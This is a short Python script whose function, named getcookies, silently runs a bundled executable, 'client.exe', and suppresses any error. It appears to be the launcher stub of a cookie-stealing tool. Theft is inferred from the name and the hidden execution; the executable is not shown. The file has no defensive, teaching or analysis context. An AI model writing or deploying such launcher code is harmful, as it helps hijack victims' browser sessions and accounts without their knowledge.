import os
import subprocess
import sys

def getcookies():
    exe_path = os.path.join(os.path.dirname(__file__), 'client.exe')
    try:
        subprocess.run([exe_path], check=True)
    except Exception as e:
        pass

if __name__ == "__main__":
    getcookies()
